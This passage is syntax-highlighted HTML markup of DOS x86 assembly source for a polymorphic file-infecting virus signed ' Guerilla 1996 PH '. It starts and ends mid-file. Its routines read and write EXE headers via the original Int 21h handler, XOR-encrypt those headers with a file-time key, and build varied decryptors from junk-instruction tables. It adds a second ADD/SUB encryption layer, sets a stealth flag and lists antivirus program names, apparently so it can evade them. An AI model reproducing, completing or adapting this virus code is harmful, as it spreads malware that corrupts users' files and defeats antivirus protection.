                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Compare with C:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">get_default_dr</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; timestamp check/creation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">check_filetime</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Filetime</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">            </span><span class="sc1">; AND ax,1fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">            </span><span class="sc1">; XOR ax,05h</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">check_filetime</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Reads 1Ch bytes from the current file to DS:DX and sets SI=DX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">read_header</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; Read from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">; 1Ch bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; do the Int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">read_header</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Writes 18h bytes to file from DS:DX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">write_header</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; Write to file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                  </span><span class="sc1">; 18h bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; Call original int 21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_header</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; calculate the number of foo bytes to write at the tail of the file</span><span class="sc0">
</span><span class="sc1">; the routine is very simple</span><span class="sc0">

</span><span class="sc5">modify_time</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; FileTime</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">modify_time</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">encrypt_header</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">file_time</span><span class="sc0">   </span><span class="sc1">; Use time as key</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">head_buffer</span><span class="sc0">          </span><span class="sc1">; Point on EXE header</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">

</span><span class="sc5">enc_head_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; Encrypt the EXE header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; using a 8bit XOR</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc_head_loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">encrypt_header</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; Put current offset in file to 0:0, that means to the start of the</span><span class="sc0">
</span><span class="sc1">; file. ES:DI of course on the SFT entry.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">seek_woff</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">seek_woff</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; copies 4 random bytes from the table pointed by CS:[SI+random] to the</span><span class="sc0">
</span><span class="sc1">; space for filling at CS:[DI]. The random offset in the table is calculated</span><span class="sc0">
</span><span class="sc1">; from the infection marker and is minor than BX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">copy_poly_b</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">inf_marker</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">num_select</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; Minor than max?</span><span class="sc0">
                </span><span class="sc6">jge</span><span class="sc0">     </span><span class="sc5">num_select</span><span class="sc0">              </span><span class="sc1">; No, retry.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Point to the selected</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; bytes</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">start_copy_loop</span><span class="sc0">   </span><span class="sc1">; Go and copy the bytes</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">

</span><span class="sc5">copy_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">start_copy_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">copy_loop</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">copy_poly_b</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Table with operations that will be put in the decryptor</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">enc_table_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; OR ax,0</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">src_fill_6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                             
                </span><span class="sc6">clc</span><span class="sc0">                             
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   
</span><span class="sc5">src_fill_10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">src_fill_9</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">src_fill_4</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">src_fill_12</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">               </span><span class="sc1">; DEC edx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">; SUB edx,01h</span><span class="sc0">
</span><span class="sc5">src_fill_7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc0">          </span><span class="sc1">; OR edx,edx</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc0">          </span><span class="sc1">; AND edx,edx</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; CMP edx,00h</span><span class="sc0">
</span><span class="sc5">src_fill_5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">src_fill_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">305h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">src_fill_11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; Jump if zero</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc0">           </span><span class="sc1">; Jump if not zero</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">src_fill_8</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_encr_start</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_encr_start</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_encr_start</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2090h</span><span class="sc0">

</span><span class="sc5">end_poly_generation_tables</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; end of table used by the poly</span><span class="sc0">

</span><span class="sc5">virus_string</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Guerilla 1996 PH '</span><span class="sc0">

</span><span class="sc5">dollar_char</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">stealth_enabled</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">av_mem_names</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB*'</span><span class="sc4">,</span><span class="sc12">'NAV'</span><span class="sc4">,</span><span class="sc12">'NEM'</span><span class="sc0">
</span><span class="sc5">av_names</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TB'</span><span class="sc4">,</span><span class="sc12">'VI'</span><span class="sc4">,</span><span class="sc12">'AV'</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc4">,</span><span class="sc12">'NE'</span><span class="sc4">,</span><span class="sc12">'VS'</span><span class="sc4">,</span><span class="sc12">'FI'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-'</span><span class="sc4">,</span><span class="sc12">'IM'</span><span class="sc4">,</span><span class="sc12">'FV'</span><span class="sc4">,</span><span class="sc12">'SC'</span><span class="sc4">,</span><span class="sc12">'QB'</span><span class="sc4">,</span><span class="sc12">'IV'</span><span class="sc0">

</span><span class="sc5">end_second_encrypt</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; Second encryption/decryption loop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">second_encr</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b0h</span><span class="sc0">                    </span><span class="sc1">; mov al,</span><span class="sc0">
</span><span class="sc5">second_rand</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; random number</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">change_to_add</span><span class="sc0">           </span><span class="sc1">; If carry change to ADD</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">operation_byte</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2Ah</span><span class="sc0">     </span><span class="sc1">; SUB</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">encrypt_work</span><span class="sc0">
</span><span class="sc5">change_to_add</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">operation_byte</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">     </span><span class="sc1">; ADD</span><span class="sc0">

</span><span class="sc5">encrypt_work</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_second_encrypt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">second_encrypt_lenght</span><span class="sc0">        </span><span class="sc1">; Lenght</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">begin_oper_loop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                    </span><span class="sc1">; Just to fool someone</span><span class="sc0">

</span><span class="sc5">oper_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">operation_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">                     </span><span class="sc1">; "ADD ah" or "SUB ah"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e0h</span><span class="sc0">                    </span><span class="sc1">; with al</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">begin_oper_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">oper_loop</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">second_encr</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">; enc_dec_copy will encrypt the body of the virus in memory (with both</span><span class="sc0">
</span><span class="sc1">; layers), then will write the encrypted body to the file (with also</span><span class="sc0">
</span><span class="sc1">; some foo bytes) and finally will decrypt the body of the virus in memory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">enc_dec_copy</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AH = 40h</span><span class="sc0">
